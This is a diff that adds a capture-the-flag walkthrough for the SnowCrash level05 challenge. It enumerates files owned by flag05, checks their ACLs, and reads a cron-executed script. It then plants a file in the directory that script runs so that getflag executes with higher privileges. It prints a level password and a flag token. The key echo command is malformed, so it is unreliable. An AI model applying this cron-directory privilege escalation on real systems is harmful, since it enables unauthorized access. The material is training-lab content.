@@ -1,0 +1,47 @@
+level04@SnowCrash:~$ su level05
+Password: ne2searoevaevoem4ov4ar8ap
+
+level05@SnowCrash:~$ ls -l
+total 0
+level05@SnowCrash:~$ pwd
+/home/user/level05
+level05@SnowCrash:~$ id
+uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
+
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver /rofs/usr/sbin/openarenaserver
+-rwxr-x---  1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+The ‘+’ Is an ACL (Access Control Lists).
+
+level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver
+getfacl: Removing leading '/' from absolute path names
+# file: usr/sbin/openarenaserver
+# owner: flag05
+# group: flag05
+user::rwx
+user:level05:r--
+group::r-x
+mask::r-x
+other::---
+
+So we can see that level05 users have only the permission to read.
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+level05@SnowCrash:~$ echo "getflag > /tmp/passwd > /opt/openarenaserver/getflag.sh
+
+We wait a bit, for a cron or something to execute the file because we we can’t execute it.
+
+level05@SnowCrash:~$ cat /tmp/passwd
+Check flag.Here is your token : viuaaale9huek52boumoomioc
